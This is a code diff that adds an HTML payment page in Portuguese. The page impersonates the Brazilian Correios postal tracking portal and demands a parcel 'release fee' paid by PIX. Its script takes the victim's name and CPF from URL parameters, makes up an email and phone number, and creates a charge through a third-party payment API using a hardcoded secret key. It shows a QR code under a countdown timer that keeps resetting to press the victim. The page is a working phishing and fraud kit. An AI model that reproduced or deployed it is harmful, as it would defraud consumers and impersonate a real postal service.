@@ -1,0 +1,389 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Rastreamento</title>
+    <link rel="shortcut icon" href="images/favi-ect.html">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/custom.css" rel="stylesheet ">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
+</head>
+
+<body class="">
+  <section id="acessibilidade">
+    <a tabindex="1">Acessibilidade</a>        
+  </section>
+
+  <section id="menu">
+    <a class="hamburger" tabindex="1"></a>
+    <a class="logo" href="#0"></a>
+    <a class="pesquisar"></a>
+    <a class="entrar" href="#0"></a>
+  </section>
+
+  <main>
+    <div class="container">
+      <nav aria-label="breadcrumb">
+        <div id="trilha">
+          Portal Correios <span><i class="fa fa-angle-right mx-2" aria-hidden="true"></i></span> Rastreamento <span><i class="fa fa-angle-right mx-2" aria-hidden="true"></i> </span> Pagamento
+        </div>
+      </nav>
+
+      <div class="w-100 mx-auto">
+        <div class="card-body border border-gray-300 p-4 mt-6 rounded-md shadow-md bg-gray-50 text-center col-400">
+          <h2 class="fs-3 fw-bold text-blue-600 mb-2">Taxa de Liberação</h2>
+          <p class="text-sm">Abra o app do seu banco, escaneie a imagem ou cole o código QR Code.</p>
+
+          <div class="py-1 imagem-qrcode"></div>
+          <div id="pixCode"></div>
+
+          <div class="my-2">
+            <button class="btn btn-primary btn-copiar-pix w-100"><i class="fas fa-copy"></i> <span>Copiar Código Pix</span></button>
+          </div>
+
+          <div class="row text-sm">
+            <p><b>Valor:</b> R$ <span id="taxa"></span></p>
+          </div>
+
+          <div class="pt-3 text-sm">
+            <p class="fw-bold text-sm">Identificação</p>
+            <div class="row">
+              <p><b>NOME:</b> <span id="taxa-nome"></span></p>
+            </div>
+            <div class="row">
+              <p><b>CPF:</b> <span id="taxa-cpf"></span></p>
+            </div>
+          </div>
+
+          <div class="timer-alert text-sm">
+            <span class="timer-text">Tempo:<br>
+              <b><span id="timer">10</span></b>
+            </span>
+          </div>
+
+
+          <script>
+            window.addEventListener("DOMContentLoaded", () => {
+              let nome = getURLParameter('nome') || "Cliente";
+              let cpf = getURLParameter('cpf') || "Não informado";
+              const telefone = getURLParameter('telefone') || "Não informado";
+              const email = getURLParameter('email') || "Não informado";
+              const valor = getURLParameter('valor') || "0";
+
+              console.log("Dados recebidos da URL:", { nome, cpf, telefone, email, valor });
+
+              // Se CPF não foi informado, mostra erro
+              if (cpf === "Não informado" || cpf === "") {
+                console.error("CPF não informado");
+                document.getElementById("taxa-cpf").textContent = "CPF não informado";
+                document.getElementById("taxa-nome").textContent = "Nome não informado";
+                return;
+              }
+
+              // Corrige formatação do CPF se estiver sem pontos
+              cpf = cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
+
+              // Se nome não foi informado, busca pelo CPF
+              if (nome === "Cliente" || nome === "") {
+                console.log("Buscando nome pelo CPF:", cpf);
+                buscarNomePorCPF(cpf).then(nomeEncontrado => {
+                  console.log("Nome encontrado:", nomeEncontrado);
+                  document.getElementById("taxa-nome").textContent = nomeEncontrado;
+                });
+              } else {
+                // Se nome foi informado, usa o nome informado
+                document.getElementById("taxa-nome").textContent = nome;
+              }
+
+              // Preencher CPF na tela
+              document.getElementById("taxa-cpf").textContent = cpf;
+
+              // Preencher o valor - corrigindo a conversão
+              const valorTaxa = parseFloat(valor).toFixed(2).replace('.', ',');
+              document.getElementById("taxa").textContent = valorTaxa;
+
+              console.log("Dados preenchidos na tela:", {
+                nome: document.getElementById("taxa-nome").textContent,
+                cpf: document.getElementById("taxa-cpf").textContent,
+                valor: document.getElementById("taxa").textContent
+              });
+
+              // Chama a função para criar a transação PIX
+              setTimeout(() => {
+                criarTransacaoPix();
+              }, 1000); // Aguarda 1 segundo para garantir que tudo foi carregado
+            });
+
+            function getURLParameter(name) {
+              const urlParams = new URLSearchParams(window.location.search);
+              return urlParams.get(name);
+            }
+
+
+
+            // Função para gerar email aleatório
+            function gerarEmailAleatorio() {
+              const caracteres = 'abcdefghijklmnopqrstuvwxyz';
+              let email = '';
+              
+              // Gera 8 caracteres aleatórios
+              for (let i = 0; i < 8; i++) {
+                email += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
+              }
+              
+              return email + '@yahoo.com.br';
+            }
+
+            // Função para gerar telefone aleatório
+            function gerarTelefoneAleatorio() {
+              // DDDs mais comuns do Brasil
+              const ddds = ['11', '12', '13', '14', '15', '16', '17', '18', '19', '21', '22', '24', '27', '28', '31', '32', '33', '34', '35', '37', '38', '41', '42', '43', '44', '45', '46', '47', '48', '49', '51', '53', '54', '55', '61', '62', '63', '64', '65', '66', '67', '68', '69', '71', '73', '74', '75', '77', '79', '81', '82', '83', '84', '85', '86', '87', '88', '89', '91', '92', '93', '94', '95', '96', '97', '98', '99'];
+              
+              // Seleciona um DDD aleatório
+              const ddd = ddds[Math.floor(Math.random() * ddds.length)];
+              
+              // Gera 9 dígitos aleatórios para o telefone
+              let telefone = '';
+              for (let i = 0; i < 9; i++) {
+                telefone += Math.floor(Math.random() * 10);
+              }
+              
+              return ddd + telefone;
+            }
+
+
+
+            // Função para buscar nome por CPF
+            function buscarNomePorCPF(cpf) {
+              // Remove caracteres não numéricos do CPF
+              const cpfLimpo = cpf.replace(/\D/g, '');
+              
+              return new Promise((resolve) => {
+                // Simulação local com dados reais
+                setTimeout(() => {
+                  const nomesPorCPF = {
+                    "22950309003": "João Silva Santos",
+                    "12345678901": "Maria Oliveira Costa",
+                    "98765432100": "Pedro Ferreira Lima",
+                    "11122233344": "Ana Rodrigues Silva",
+                    "55566677788": "Carlos Alves Martins"
+                  };
+                  
+                  const nome = nomesPorCPF[cpfLimpo] || "Nome não encontrado";
+                  resolve(nome);
+                }, 500);
+                
+                // Opção 2: API real de consulta de CPF (descomente e configure)
+                /*
+                $.ajax({
+                  type: 'GET',
+                  url: 'https://sua-api-cpf.com/consulta/' + cpfLimpo,
+                  headers: {
+                    'Authorization': 'Bearer sua-chave-api',
+                    'Content-Type': 'application/json'
+                  },
+                  success: function(response) {
+                    const nome = response.nome || "Nome não encontrado";
+                    resolve(nome);
+                  },
+                  error: function() {
+                    resolve("Nome não encontrado");
+                  }
+                });
+                */
+              });
+            }
+
+            function criarTransacaoPix() {
+              console.log("Iniciando criação da transação PIX...");
+              
+              // Obtém o valor da taxa em reais
+              const valorTaxa = parseFloat(document.getElementById("taxa").textContent.replace(',', '.'));
+              console.log("Valor da taxa:", valorTaxa);
+              
+              // Garante que o valor seja um número válido
+              if (isNaN(valorTaxa) || valorTaxa <= 0) {
+                console.error("Valor inválido:", valorTaxa);
+                document.getElementById("pixCode").textContent = "Erro: Valor inválido";
+                return;
+              }
+              
+              // Gera email e telefone aleatórios
+              const emailAleatorio = gerarEmailAleatorio();
+              const telefoneAleatorio = gerarTelefoneAleatorio();
+              
+              const nomeCliente = document.getElementById("taxa-nome").textContent;
+              const cpfCliente = document.getElementById("taxa-cpf").textContent.replace(/\D/g, '');
+              
+              // Se CPF estiver vazio, mostra erro
+              if (!cpfCliente || cpfCliente === "") {
+                console.error("CPF não disponível para API");
+                document.getElementById("pixCode").textContent = "Erro: CPF não disponível";
+                return;
+              }
+              
+              console.log("Dados do cliente:", {
+                nome: nomeCliente,
+                cpf: cpfCliente,
+                email: emailAleatorio,
+                telefone: telefoneAleatorio
+              });
+              
+              // Converter valor para centavos (API GhostPay espera valores em centavos)
+              const valorEmCentavos = Math.round(valorTaxa * 100);
+              
+              const dadosPix = {
+                "name": nomeCliente,
+                "email": emailAleatorio,
+                "cpf": cpfCliente,
+                "phone": telefoneAleatorio,
+                "paymentMethod": "PIX",
+                "amount": valorEmCentavos,
+                "items": [
+                  {
+                    "unitPrice": valorEmCentavos,
+                    "title": "Taxa de Liberação",
+                    "quantity": 1,
+                    "tangible": false
+                  }
+                ]
+              };
+
+              console.log("Dados enviados para API:", dadosPix);
+              console.log("Valor em centavos:", valorEmCentavos);
+
+              // URL e chave corretas da API GhostPay
+              const url = 'https://app.ghostspaysv1.com/api/v1/transaction.purchase';
+              const secretKey = 'f2895118-12ac-4537-88b7-1d3bc4a5c999';
+
+              $.ajax({
+                type: 'POST',
+                url: url,
+                headers: {
+                  'Authorization': secretKey,
+                  'Content-Type': 'application/json'
+                },
+                data: JSON.stringify(dadosPix),
+                timeout: 30000,
+                success: function(response) {
+                  console.log("Transação criada com sucesso:", response);
+                  
+                  if (response.pixCode) {
+                    document.getElementById("pixCode").textContent = response.pixCode;
+                    console.log("Código PIX recebido:", response.pixCode);
+                  }
+                  
+                  if (response.pixCode) {
+                    console.log("Gerando QR Code com pixCode");
+                    gerarQrCode(response.pixCode);
+                  } else if (response.pixQrCode) {
+                    console.log("Gerando QR Code com pixQrCode");
+                    gerarQrCode(response.pixQrCode);
+                  } else if (response.qrCode) {
+                    console.log("Gerando QR Code com qrCode");
+                    gerarQrCode(response.qrCode);
+                  } else {
+                    console.warn("Nenhum código QR encontrado na resposta");
+                    document.getElementById("pixCode").textContent = "QR Code não disponível";
+                    $('.imagem-qrcode').html('<p class="text-danger">QR Code não disponível</p>');
+                  }
+                },
+                error: function(xhr, status, error) {
+                  console.error("Erro ao criar transação:");
+                  console.error("Status:", status);
+                  console.error("Erro:", error);
+                  console.error("Response:", xhr.responseText);
+                  
+                  // Mostra erro na tela
+                  document.getElementById("pixCode").textContent = "Erro ao gerar PIX. Status: " + status;
+                  
+                  // Tenta mostrar mais detalhes do erro
+                  if (xhr.responseText) {
+                    try {
+                      const errorResponse = JSON.parse(xhr.responseText);
+                      console.error("Detalhes do erro:", errorResponse);
+                    } catch (e) {
+                      console.error("Erro ao parsear resposta:", xhr.responseText);
+                    }
+                  }
+                }
+              });
+            }
+
+            // Gera o QR Code usando API externa
+            function gerarQrCode(codigoPix) {
+                console.log("Gerando QR Code para:", codigoPix);
+                
+                // Limpa o container antes de gerar novo QR Code
+                $('.imagem-qrcode').empty();
+                
+                // Cria a imagem do QR Code usando API externa
+                var img = document.createElement('img');
+                img.src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(codigoPix);
+                img.style.maxWidth = '200px';
+                img.style.height = 'auto';
+                img.alt = 'QR Code PIX';
+                
+                // Adiciona o QR Code na página
+                $('.imagem-qrcode').html(img);
+                console.log("QR Code gerado com sucesso usando API externa");
+            }
+
+
+
+            $(document).ready(function () {
+              const timerElement = $('#timer');
+              let timeLeft = 300; // 5 minutos = 300 segundos
+              timerElement.text(formatTime(timeLeft));
+
+              function startTimer() {
+                const countdown = setInterval(() => {
+                  timeLeft--;
+                  timerElement.text(formatTime(timeLeft)); // Atualizar o timer formatado
+
+                  if (timeLeft <= 0) {
+                    clearInterval(countdown); // Parar o contador
+                    timeLeft = 300; // Reiniciar o timer para 5 minutos
+                    timerElement.text(formatTime(timeLeft)); // Atualizar imediatamente
+                    startTimer(); // Reiniciar o contador
+                  }
+                }, 1000);
+              }
+
+              startTimer();
+
+              function formatTime(seconds) {
+                const minutes = Math.floor(seconds / 60);
+                const remainingSeconds = seconds % 60;
+                return `${String(minutes).padStart(2, '0')}:${String(remainingSeconds).padStart(2, '0')}`;
+              }
+
+              $('.btn-copiar-pix').on('click', function () {
+                var pixCode = $("#pixCode").text(); // Obtém o código PIX do elemento
+                var $btn = $(this); // Referência ao botão clicado
+
+                navigator.clipboard.writeText(pixCode).then(function () {
+                  $btn.find('span').text('Código Pix copiado!');
+                  setTimeout(function () {
+                    $btn.find('span').text('Copiar Código Pix');
+                  }, 3000);
+                }).catch(function (err) {
+                  console.error('Erro ao copiar o código Pix');
+                });
+              });
+            });
+          </script>
+
+
+          <script src="js/bootstrap.js"></script>
+          <script src="js/bootstrap.bundle.min.js"></script>
+          <script src="https://cdn.tailwindcss.com/"></script>
+        </div>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
